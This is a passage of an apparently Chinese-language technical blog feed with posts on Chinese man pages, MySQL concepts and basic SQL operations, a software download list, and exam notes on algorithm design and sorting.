~/.bashrc<br></code></pre></td></tr></table></figure><p>更改本地化设置后，需要重新启动系统或者注销并重新登录用户才能使更改生效。</p><h2 id="使用man"><a href="#使用man" class="headerlink" title="使用man"></a>使用man</h2><p>在配置好后，就可以使用man命令愉快地查看命令的中文解释了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">man <span class="hljs-built_in">ls</span></span><br><br>LS(1)                            General Commands Manual                            LS(1)<br><br>NAME<br>       ls, dir, vdir - 列目录内容<br><br>提要<br>       ls [选项] [文件名...]<br><br>       POSIX 标准选项: [-CFRacdilqrtu1]<br><br>GNU 选项 (短格式):<br>       [-1abcdfgiklmnopqrstuxABCDFGLNQRSUX]  [-w  cols]  [-T  cols] [-I pattern] [--full-<br>       time]               [--format=&#123;long,verbose,commas,across,vertical,single-column&#125;]<br>       [--sort=&#123;none,time,size,extension&#125;]       [--time=&#123;atime,access,use,ctime,status&#125;]<br>       [--color[=&#123;none,auto,always&#125;]] [--help] [--version] [--]<br><br>描述（ DESCRIPTION ）<br>       程序ls先列出非目录的文件项，然后是每一个目录中的“可显示”文件。如果  没有选项之外的<br>       参数【译注：即文件名部分为空】出现，缺省为 &quot;.&quot; （当前目录）。 选项“ -d ”使得目录与<br>       非目录项同样对待。除非“ -a ” 选项出现，文 件名以“.”开始的文件不属“可显示”文件。<br><br>       以当前目录为准，每一组文件（包括非目录文件项，以及每一内含文件的目录）分  别按文件<br>       名比较顺序排序。如果“ -l ”选项存在，每组文件前显示一摘要行: 给出该组文件长度之和（<br>       以 512 字节为单位）。<br><br>       输出是到标准输出（  stdout  ）。除非以“  -C  ”选项要求按多列输出，输出  将是一行一<br>       个。然而，输出到终端时，单列输出或多列输出是不确定的。可以分别 用选项“ -1 ” 或“ -C<br>       ”来强制按单列或多列输出。<br><br>       -C     多列输出，纵向排序。<br><br>       -F     每个目录名加“ / ”后缀，每个 FIFO 名加“ | ”后缀， 每个可运行名加“ * ”后缀。<br><br>       -R     递归列出遇到的子目录。<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在Linux下使用man查看命令帮助，命令的词典。但默认的英文解释可能不便于理解。&lt;/p&gt;
&lt;h2 id=&quot;安装manpages-zh可以查看中文解释&quot;&gt;&lt;a href=&quot;#安装manpages-zh可以查看中文解释&quot; class=&quot;headerlink&quot; title=&quot;安</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>mysql数据库基本概念</title>
    <link href="http://example.com/2024/03/07/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <id>http://example.com/2024/03/07/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</id>
    <published>2024-03-07T13:50:06.000Z</published>
    <updated>2024-03-07T14:02:44.006Z</updated>
    
    <content type="html"><![CDATA[<p>MySQL数据库的相关的术语和数据类型</p><table><thead><tr><th>术语</th><th>描述</th></tr></thead><tbody><tr><td>数据库(Database)</td><td>用于存储数据的容器，可以包含多个表和其他相关对象。</td></tr><tr><td>表(Table)</td><td>数据库中的基本组织单位，用于存储数据。表由行和列组成。</td></tr><tr><td>列(Column)</td><td>表中的一个字段，用于存储特定类型的数据。</td></tr><tr><td>行(Row)</td><td>表中的一个记录，包含了一组相关的数据。</td></tr><tr><td>主键(Primary Key)</td><td>表中唯一标识每个行的字段。主键必须具有唯一性且不为空。</td></tr><tr><td>外键(Foreign Key)</td><td>表中的一个字段，用于与另一个表中的主键形成关联。</td></tr><tr><td>索引(Index)</td><td>用于提高数据检索效率的数据结构，可以加速查询操作。</td></tr><tr><td>SQL(Structured Query Language)</td><td>结构化查询语言，用于与数据库交互的标准语言。</td></tr></tbody></table><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>以下是常用的数据类型及其作用，采用表格形式列出：</p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>int</td><td>整型</td></tr><tr><td>float</td><td>单精度浮点（4字节，32位）</td></tr><tr><td>double</td><td>双精度浮点（8字节，64位）</td></tr><tr><td>char</td><td>固定长度的字符类型</td></tr><tr><td>varchar</td><td>可变长度的字符类型</td></tr><tr><td>text</td><td>文本</td></tr><tr><td>image</td><td>图片</td></tr><tr><td>decimal(5,2)</td><td>5个有效长度数字，小数点后面有2位的十进制数</td></tr></tbody></table><h4 id="全部数据类型"><a href="#全部数据类型" class="headerlink" title="全部数据类型"></a>全部数据类型</h4><ol><li><p><strong>整数类型(Integers)</strong>:</p><ul><li><code>INT</code>: 整数类型，范围通常为-2147483648到2147483647。</li><li><code>BIGINT</code>: 大整数类型，范围通常为-9223372036854775808到9223372036854775807。</li></ul></li><li><p><strong>浮点数类型(Floating-Point Numbers)</strong>:</p><ul><li><code>FLOAT</code>: 单精度浮点数。</li><li><code>DOUBLE</code>: 双精度浮点数。</li></ul></li><li><p><strong>定点数类型(Fixed-Point Numbers)</strong>:</p><ul><li><code>DECIMAL</code>: 定点数，用于精确存储小数，需要指定精度和小数位数。</li></ul></li><li><p><strong>字符类型(Strings)</strong>:</p><ul><li><code>CHAR</code>: 固定长度字符串。</li><li><code>VARCHAR</code>: 可变长度字符串，根据存储的内容分配空间。</li><li><code>TEXT</code>: 用于存储大量文本数据。</li></ul></li><li><p><strong>日期和时间类型(Date and Time)</strong>:</p><ul><li><code>DATE</code>: 日期类型，格式为’YYYY-MM-DD’。</li><li><code>TIME</code>: 时间类型，格式为’HH:MM:SS’。</li><li><code>DATETIME</code>: 日期和时间类型，格式为’YYYY-MM-DD HH:MM:SS’。</li><li><code>TIMESTAMP</code>: 时间戳类型，存储自UNIX纪元（’1970-01-01 00:00:01’ UTC）以来的秒数。</li></ul></li><li><p><strong>布尔类型(Boolean)</strong>:</p><ul><li><code>BOOL</code> 或 <code>BOOLEAN</code>: 布尔类型，存储True或False。</li></ul></li><li><p><strong>二进制类型(Binary)</strong>:</p><ul><li><code>BLOB</code>: 二进制大对象，用于存储大量二进制数据。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;MySQL数据库的相关的术语和数据类型&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;术语&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;数据库(Database)&lt;/td&gt;
&lt;td&gt;用于存储数据的容器，可以包含</summary>
      
    
    
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>mysql数据库基本操作</title>
    <link href="http://example.com/2024/03/07/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2024/03/07/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</id>
    <published>2024-03-07T13:41:56.000Z</published>
    <updated>2024-03-07T14:02:40.925Z</updated>
    
    <content type="html"><![CDATA[<p>MySQL数据常见的操作包括创建数据库、创建表、插入数据、查询数据、更新数据，删除数据和更改表结构。</p><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE my_database;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE ecommerce_db;<br></code></pre></td></tr></table></figure><h3 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">USE my_database;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">USE ecommerce_db;<br></code></pre></td></tr></table></figure><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (<br>    id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,<br>    username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">unique</span> key<br>);<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> products (<br>    id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),<br>    price <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>)<br>);<br></code></pre></td></tr></table></figure><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, email) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;john_doe&#x27;</span>, <span class="hljs-string">&#x27;john@example.com&#x27;</span>);<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> products (name, price) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;Laptop&#x27;</span>, <span class="hljs-number">1200.00</span>);<br></code></pre></td></tr></table></figure><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> email <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;john.doe@example.com&#x27;</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;john_doe&#x27;</span>;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> products <span class="hljs-keyword">SET</span> price <span class="hljs-operator">=</span> <span class="hljs-number">1500.00</span> <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Laptop&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;john_doe&#x27;</span>;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Laptop&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="更改表结构"><a href="#更改表结构" class="headerlink" title="更改表结构"></a>更改表结构</h3><h4 id="添加新列"><a href="#添加新列" class="headerlink" title="添加新列"></a>添加新列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name <span class="hljs-keyword">ADD</span> column_name datatype;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">ADD</span> age <span class="hljs-type">INT</span>;<br></code></pre></td></tr></table></figure><h4 id="修改列"><a href="#修改列" class="headerlink" title="修改列"></a>修改列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name MODIFY column_name new_datatype;<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name CHANGE column_name new_datatype;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users MODIFY age <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h4 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> column_name;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">COLUMN</span> age;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;MySQL数据常见的操作包括创建数据库、创建表、插入数据、查询数据、更新数据，删除数据和更改表结构。&lt;/p&gt;
&lt;h3 id=&quot;创建数据库&quot;&gt;&lt;a href=&quot;#创建数据库&quot; class=&quot;headerlink&quot; title=&quot;创建数据库&quot;&gt;&lt;/a&gt;创建数据库&lt;/h3&gt;&lt;fi</summary>
      
    
    
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>软件资源分享</title>
    <link href="http://example.com/2024/02/29/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/"/>
    <id>http://example.com/2024/02/29/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/</id>
    <published>2024-02-29T03:43:37.000Z</published>
    <updated>2024-04-03T04:00:38.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="远程桌面软件RDP"><a href="#远程桌面软件RDP" class="headerlink" title="远程桌面软件RDP"></a>远程桌面软件RDP</h1><h2 id="下载连接"><a href="#下载连接" class="headerlink" title="下载连接"></a>下载连接</h2><h2 id="Microsoft-远程桌面"><a href="#Microsoft-远程桌面" class="headerlink" title="Microsoft 远程桌面"></a><a href="/download/Microsoft.apk">Microsoft 远程桌面</a></h2><h1 id="V3rey"><a href="#V3rey" class="headerlink" title="V3rey"></a>V3rey</h1><h2 id="下载连接-1"><a href="#下载连接-1" class="headerlink" title="下载连接"></a>下载连接</h2><h2 id="V3rey-1"><a href="#V3rey-1" class="headerlink" title="V3rey"></a><a href="/download/v2rayNG.apk">V3rey</a></h2><h1 id="IDA-Pro-7-7"><a href="#IDA-Pro-7-7" class="headerlink" title="IDA Pro 7.7"></a>IDA Pro 7.7</h1><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><h2 id="IDA-Pro-7-7-1"><a href="#IDA-Pro-7-7-1" class="headerlink" title="IDA Pro 7.7"></a><a href="/download/IDA7.7.zip">IDA Pro 7.7</a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;远程桌面软件RDP&quot;&gt;&lt;a href=&quot;#远程桌面软件RDP&quot; class=&quot;headerlink&quot; title=&quot;远程桌面软件RDP&quot;&gt;&lt;/a&gt;远程桌面软件RDP&lt;/h1&gt;&lt;h2 id=&quot;下载连接&quot;&gt;&lt;a href=&quot;#下载连接&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="软件资源" scheme="http://example.com/tags/%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>算法分析与设计</title>
    <link href="http://example.com/2024/01/08/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/"/>
    <id>http://example.com/2024/01/08/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/</id>
    <published>2024-01-07T18:03:28.000Z</published>
    <updated>2024-01-07T18:06:01.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="考试题型及分值"><a href="#考试题型及分值" class="headerlink" title="考试题型及分值"></a>考试题型及分值</h1><p>一、选择题（共 9 小题，每小题 2 分，共 18 分）<br>二、判断题（共 5 小题，每小题 2 分，共 10 分）<br>三、填空题（共 6 小题，每空1分，共 14 分）<br>四、解答题（共 5 大题，共 58 分）</p><h1 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h1><h3 id="动态规划（关键）"><a href="#动态规划（关键）" class="headerlink" title="动态规划（关键）"></a>动态规划（关键）</h3><p>动态规划的要素（填空）：&#x3D;&#x3D;最优结构，重叠子问题&#x3D;&#x3D;</p><p>动态规划的原理、思想</p><p>多段图规划</p><p>0-1背包问题</p><h3 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h3><p>和动态规划区别</p><p><strong>最短路径：迪杰斯特算法！</strong></p><p>Prim和Kruskal算法</p><h3 id="回溯法"><a href="#回溯法" class="headerlink" title="回溯法"></a>回溯法</h3><p>关于0-1背包问题的算法，思想</p><h3 id="分支限界法！"><a href="#分支限界法！" class="headerlink" title="分支限界法！"></a>分支限界法！</h3><h3 id="随机算法（了解，什么时候使用）"><a href="#随机算法（了解，什么时候使用）" class="headerlink" title="随机算法（了解，什么时候使用）"></a>随机算法（了解，什么时候使用）</h3><h1 id="第一章-基础知识-排序"><a href="#第一章-基础知识-排序" class="headerlink" title="第一章 基础知识+排序"></a>第一章 基础知识+排序</h1><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>1.算法由<strong>操作、控制结构、数据结构</strong>三要素组成</p><p>2.算法是什么：<strong>问题的程序化解决方案</strong></p><p>3.算法特征：有限性&#x2F;<strong>有穷性</strong>：对算法的每一次输入，算法都必须在有限步骤（即有限</p><p>时间）内结束</p><ol start="4"><li>算法与程序区别：</li></ol><p>(1)一个程序不一定满足<strong>有穷性</strong>（操作系统）。</p><p>(2)程序中的指令必须是机器可执行的，而算法中的指令则无此限制。</p><p>(3)<strong>算法代表了对问题的解</strong>，而程序则是算法在计算机上的特定的实现。</p><p>5.算法的描述（流程图、自然语言、程序语言、伪代码）</p><p>伪代码约定：利用i←j←e 来表示多重赋值，等价于 j←e 和i←j</p><p>6.算法的设计要求：</p><p>(1)正确性（对输入、输出和处理过程等有明确的<strong>无歧义</strong>的描述；有正确的输出结果并停止）</p><p>a)    不正确的算法：如果算法的<strong>错误率</strong>可以控制，也是有用的。</p><p><strong>b)</strong>    <strong>程序调试不能证明程序无错误</strong></p><p>(2)可读性</p><p>(3)健壮性（对于非法的输入数据，能适当地做出反应或进行处理(<strong>异常中断</strong>)）</p><p>(4)效率与低存储等需求</p><h2 id="二、算法分析基础"><a href="#二、算法分析基础" class="headerlink" title="二、算法分析基础"></a>二、算法分析基础</h2><p>1.算法分析的基本框架</p><p>(1)算法分析是指对一个算法所需要的资源进行预测，通常是对计算时间和空间的预测，采用<strong>随机存取机</strong>（RAM）计算模型。</p><p>算法运行时间是指在<strong>特定输入时，所执行的基本操作数</strong>。</p><p>输入数据的<strong>规模</strong>和<strong>分布</strong>是影响算法运行时间的两个主要因素。</p><p>对于大规模输入，通常只关注运行时间效率<strong>函数的增长率</strong></p><p>度量算法效率的方法：</p><p>事后统计 事前分析估算 算法的存储量（<strong>输入数据所占、程序本身所占和辅助变量所占</strong>）</p><p>(2)空间复杂度：通常指<strong>辅助变量所占空间 （S(n)&#x3D;O(f(n))）</strong></p><p>若额外空间相对于输入数据量是<strong>常数</strong>，该算法<strong>原地工作</strong>，频度&#x3D;重复</p><p>(3)时间复杂度：（嵌套最深层语句）</p><p>语句的频度之和构成运行时间。</p><p>对于规模为n的任何输入，一般考察算法的最坏运行时间</p><p>O(1)——常量阶   O(logn) ——对数阶  O(n) ——线性阶  O(nlogn) ——线性对数阶</p><p>O(n2) ——平方阶  O(n3) ——立方阶   O(nk)——多项式阶  O(2n) ——指数阶</p><p>&#x3D;&#x3D;<strong>Ο是渐进上界，Ω是渐进下界。Θ需同时满足大Ο和Ω，称为确界(必须同时符合上界和下界)。Ο表示了最差性能</strong>&#x3D;&#x3D;</p><h2 id="三、算法设计策略：分治法"><a href="#三、算法设计策略：分治法" class="headerlink" title="三、算法设计策略：分治法"></a>三、算法设计策略：分治法</h2><p>1.递归与分治法</p><p>分治策略: 将原问题<strong>划分</strong>为n个规模较小而结构与原问题相似的子问题,<strong>递归地解决</strong>这些子问题，然后再<strong>合并</strong>其结果，就得到原问题的解。</p><p>2.归并排序算法：</p><p>① 分解：把n个元素分成各含n&#x2F;2个元素的子序列；D(n)&#x3D;Θ(1)</p><p>② 解决：用归并排序算法对两个子序列递归地排序；2T(n&#x2F;2)</p><p>③ 合并：合并两个已排序的子序列以得到排序结果。C(n)&#x3D;Θ(n)</p><p>3.分治法分析</p><p><img src="/img/course/clip_image002.png" alt="img"></p><p>D(n)分解时间  C(n)合并时间  T(n)是一个规模为n的问题的运行时间</p><p>总共层数是lgn+1层，每一层代价都是cn，所以总代价为：cn(lgn +1) &#x3D;cnlgn+cn&#x3D;Θ(nlgn)</p><h1 id="第二章-排序"><a href="#第二章-排序" class="headerlink" title="第二章 排序"></a>第二章 排序</h1><h3 id="一、排序问题"><a href="#一、排序问题" class="headerlink" title="一、排序问题"></a>一、排序问题</h3><p>稳定排序算法：相同的数据，排序后仍维持原有的相对次序</p><h3 id="二、冒泡排序-选择排序"><a href="#二、冒泡排序-选择排序" class="headerlink" title="二、冒泡排序 &amp; 选择排序"></a>二、冒泡排序 &amp; 选择排序</h3><p>1.冒泡排序</p><p>基本思想：</p><p>① 比较相邻的两个元素。如果第一个元素比第二个大，就交换它们；</p><p>② 对每一对相邻元素做同样的操作，从开始第一对到结尾的最后一对，则最后的元素是最大的数；</p><p>③ 针对所有的元素重复以上的步骤，除了最后一个元素；</p><p>④ 重复步骤1~3，直到排序完成。</p><p>2.选择排序</p><p>基本思想：</p><p>① 初始状态：无序区为R[1..n]，有序区为空；</p><p>② 第i趟排序(i&#x3D;1, 2, 3, …, n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n</p><p>）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1</p><p>个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录</p><p>个数减少1个的新无序区；</p><p>③ n-1趟结束，数组有序化了</p><p>n个记录的直接选择排序，可经过n-1趟直接选择排序得到有序结果</p><p>算法分析：唯一的好处是不占用额外的内存空间</p><h3 id="三、插入排序-希尔排序"><a href="#三、插入排序-希尔排序" class="headerlink" title="三、插入排序 &amp; 希尔排序"></a>三、插入排序 &amp; 希尔排序</h3><ol><li><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4></li></ol><p>原理：通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。一般来说，插入排序采用in-place基于数组进行实现</p><p>算法分析：插入排序的实现，通常采用<strong>in-place</strong>基于数组排序 (即只需O(1)的额外空间)，在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><ol start="2"><li>希尔排序（<strong>缩小增量排序</strong>）：<strong>优先比较距离较远的元素</strong></li></ol><p>先将整个待排序的记录序列，分割成为若干组待排序的子序列，分别进行直接插入排序。</p><p><strong>出发点</strong>：插入排序在元素基本有序的情况下，效率很高。</p><p><strong>gap</strong>：初始值设为 n&#x2F;2，然后不断减半。</p><p>算法分析：希尔排序的核心在于<strong>间隔序列</strong>的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。</p><h3 id="四、快速排序-堆排序"><a href="#四、快速排序-堆排序" class="headerlink" title="四、快速排序 &amp; 堆排序"></a>四、快速排序 &amp; 堆排序</h3><p>1.快速排序（前面的比选定元素小，后面的大，然后对两边递归）</p><p>基本思想: 采用<strong>分治策略</strong>把未排序数组分为两部分，然后分别<strong>递归</strong>调用自身进行排序：</p><p>① 分解：数组A[p…r]被划分为两个（可能空）子数组A[p…q-1]和A[p+1..r]，使得A[p…q-1]中每个元素都小于或等于A[q]和A[q+1..r]中的元素。下标q在这个划分过程中进行计算；</p><p>② 解决：递归调用快速排序，对子数组A[p…q-1]和A[q+1..r]排序；</p><p>③ 合并：不需要任何操作。</p><p><strong>如何防止出现最坏情况发生</strong>？</p><p>策略1：显示地对输入进行排列使得快速排序算法随机化</p><p>策略2：采用<strong>随机取样</strong>的随机化技术：从子数组A[p…r]中随机选择一个元素作为主元，从而达到可以对输入数组的划分能够比较对称</p><p>2.堆排序</p><p>(1)堆排序（Heapsort）是指利用堆该数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：<strong>子结点的键值或索引总是小于（或者大于）它的父节点</strong></p><p>(2)基本思想：</p><p>① 将初始待排序关键字序列(R1,R2….Rn)构建成<strong>大顶堆</strong>，此堆为初始的无序区；</p><p>② 将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn- 1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;&#x3D;R[n]；</p><p>③ 由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成</p><p>(3)堆数据结构是一种数组对象，可以被视为一棵完全二叉树。树中每个节点与数组中存放该结点值的元素对应。树的每一层都是填满的，最后一层可能除外（从一个结点的左子树开始填）</p><p>在堆排序算法中，如果使用大根堆，堆中最大元素位于树根；</p><p>小根堆通常在构造<strong>优先队列</strong>时使用</p><p>是一种in-place原地排序算法</p><p>堆排序算法与插入排序算法设计策略关系是否类似？</p><p>（<strong>减治法</strong>：不断减小被处理的问题规模）</p><p>五、线性排序算法 